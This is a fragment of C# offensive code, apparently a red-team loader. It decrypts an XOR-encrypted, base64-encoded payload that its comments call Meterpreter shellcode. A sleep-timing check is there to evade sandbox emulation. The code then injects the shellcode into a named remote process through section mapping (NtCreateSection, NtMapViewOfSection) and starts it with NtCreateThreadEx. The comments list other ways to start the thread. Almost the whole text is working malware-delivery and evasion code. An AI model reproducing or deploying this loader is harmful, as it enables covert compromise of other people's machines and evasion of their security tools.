            string base64Encoded = "rz3z14K7/2NyMzVwEiUiYjpi4TUXe/9zMz37YWobuDFSfkXoG3rHeTgbuBEie0Xh/0kRT3B/EyKz+nlgUrSS3iAbuDFSuDYdEiQ4MqI1shtqOHYu1gdwM3LYs+tyM3Rp1rUEVDpS4+g6KyRl2DVQenOD0DU6zL1g2EH4fkOae2Kke0Xh/zSx+n8SMqJK0wHQH3Y8F3oWCrIH6yxl2DVUenODVSL5Pzxl2DVsenODcuh2uzwggzQocioNajkzazV4Ei84sJ5zcjGN0yxgCi84uGC6eJyNzClpYq4jeswkWg0bXRFVUzQme/uyeqSwfwMHVIqlYCEbuoIhaTkQkzhB+iEAetlIZQ2GU3VwM42G221yM3QQakdeAkRrHVJcAkIXUy84urMa9KPJMnQhHkS5YCE5MDA7iSOozLNwM3JTzLaaQnQhU1pBRENjQSgqdh5JPxYoAkM3YzweeSRWOiw3HkVnWhcgRztlIy0GACAEV1IlfjlCKgEhSjwdBSw5XS57PzwAeRsqYg8QSx5COUIFCwM2XTkCUjZzA0RCAR4XazwqXRpIakUqZRkrAgwiAjxnEkdHQEpTe+qzYC5gCzhB+iEbi2NAm/AhU3VwYyEAeqSw2CEPaIqle/uVWWkte/3QOWoqYRrTAGNyev3BOXExajvpRiXstXQhU3WP5j9i8zAoe/3QHkS5fkOaYDA79LYMVW0LzKfW8xZte7Pg22ZwMzvpd5NH03QhU3WP5jqs/Bdw2N7JBnVwMyEKWSMoev3wkpdgerWTM3NyMz2bC9Ej1nJTM2ON5jyyACY4upUbupI6uq5olLVwE3JTeuqLes4zxfySM3JTM5yne/flc/CwR8A1uGQ6MrekkwCia7ELWWMriJQ8eX8xuqis5g==";

            /* EVASION 1: Sleep to evade emulation */
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            //byte key = 0xFF; // good key
            string key = "Sup3rS3cr3t!";


            byte[] buf = System.Convert.FromBase64String(base64Encoded);


            if (t2 < 2)
            {
                key = "NowayNoway!"; // wrong key
            }

            if (key == "NowayNoway!")
            {
                Sleep(1000);
            }
            else
            {
                /* Meterpreter decryption */
                Console.WriteLine("[+] Decrypting the shellcode");
                for (int i = 0; i < buf.Length; i++)
                {
                    //buf[i] = (byte)(((uint)buf[i] ^ key) & 0xFF);
                    buf[i] = (byte)(((uint)buf[i] ^ key[i % (key.Length)]) & 0xFF);
                }


                //Deobfusate host process name
                for (int i = 0; i < obfuscatedstringname.Length; i++)
                {
                    stringname = stringname + obfuscatedstringname[obfuscatedstringname.Length - i - 1];
                }
                Console.WriteLine("[+] Deobfuscated the host process name: " + stringname);


                // Create the section handle.
                IntPtr ptr_section_handle = IntPtr.Zero;
                long buffer_size = buf.Length;
                UInt32 SECTION_MAP_WRITE = 0x0002;
                UInt32 SECTION_MAP_READ = 0x0004;
                UInt32 SECTION_MAP_EXECUTE = 0x0008;


                //UInt32 SECTION_READWRITE = SECTION_MAP_READ | SECTION_MAP_WRITE;
                //UInt32 SECTION_READEXECUTE = SECTION_MAP_READ | SECTION_MAP_EXECUTE;
                UInt32 SECTION_ALL_ACCESS = SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE;


                UInt32 PAGE_EXECUTE_READWRITE = 0x40;
                UInt32 PAGE_READWRITE = 0x04;
                UInt32 PAGE_EXECUTE_READ = 0x20;
                uint SEC_COMMIT = 0x08000000;

                UInt32 create_section_status = NtCreateSection(ref ptr_section_handle, SECTION_ALL_ACCESS, IntPtr.Zero, ref buffer_size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, IntPtr.Zero);
                //UInt32 create_section_status = NtCreateSection(ref ptr_section_handle, SECTION_ALL_ACCESS, IntPtr.Zero, ref buffer_size, SECTION_EXECUTE_READWRITE, SEC_COMMIT, IntPtr.Zero);
                if (create_section_status != 0 || ptr_section_handle == IntPtr.Zero)
                {
                    Console.WriteLine("[-] An error occured while creating the section.");
                    return;
                }
                Console.WriteLine("[+] The section has been created successfully.");
                Console.WriteLine("[*] ptr_section_handle: 0x" + String.Format("{0:X}", (ptr_section_handle).ToInt64()));

                // Map a view of a section into the virtual address space of the current process.
                long local_section_offset = 0;
                IntPtr ptr_local_section_addr = IntPtr.Zero;
                UInt32 local_map_view_status = NtMapViewOfSection(ptr_section_handle, GetCurrentProcess(), ref ptr_local_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, PAGE_READWRITE);
                if (local_map_view_status != 0 || ptr_local_section_addr == IntPtr.Zero)
                {
                    Console.WriteLine("[-] An error occured while mapping the view within the local section.");
                    return;
                }
                Console.WriteLine("[+] The local section has been mapped successfully as RW.");
                Console.WriteLine("[*] Local section address: 0x" + String.Format("{0:X}", (ptr_local_section_addr).ToInt64()));

                // Copy the shellcode into the mapped section.
                Marshal.Copy(buf, 0, ptr_local_section_addr, buf.Length);


                // Map a view of the section in the virtual address space of the targeted process.
                Process p = Process.GetProcessesByName(stringname)[0];
                IntPtr hProcess = OpenProcess(0x001F0FFF, false, p.Id);


                IntPtr ptr_remote_section_addr = IntPtr.Zero;
                UInt32 remote_map_view_status = NtMapViewOfSection(ptr_section_handle, hProcess, ref ptr_remote_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, PAGE_EXECUTE_READ);
                if (remote_map_view_status != 0 || ptr_remote_section_addr == IntPtr.Zero)
                {
                    Console.WriteLine("[-] An error occured while mapping the view within the remote section.");
                    return;
                }
                Console.WriteLine("[+] The remote section has been mapped successfully as RX.");
                Console.WriteLine("[*] Remote section address: 0x" + String.Format("{0:X}", (ptr_remote_section_addr).ToInt64()));

                // Unmap the view of the section from the current process & close the handle.
                Console.WriteLine("[+] Unmapping local section.");
                NtUnmapViewOfSection(GetCurrentProcess(), ptr_local_section_addr);
                NtClose(ptr_section_handle);

                Console.WriteLine("[+] Creating a Thread to run the shellcode...");

                /*
                 * Alternatives:
                 * CreateRemoteThread(hProcess, IntPtr.Zero, 0, ptr_remote_section_addr, IntPtr.Zero, 0, IntPtr.Zero);
                 * NtCreateThreadEx(ref ThreadHandle, 0x1FFFFF, IntPtr.Zero, hProcess, ptr_remote_section_addr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
                 * RtlCreateUserThread(hProcess, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, ptr_remote_section_addr, IntPtr.Zero, ref ThreadHandle, ref id);
                */

                IntPtr ThreadHandle = IntPtr.Zero;
                NtCreateThreadEx(ref ThreadHandle, 0x1FFFFF, IntPtr.Zero, hProcess, ptr_remote_section_addr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);

            }
        }
    }
}
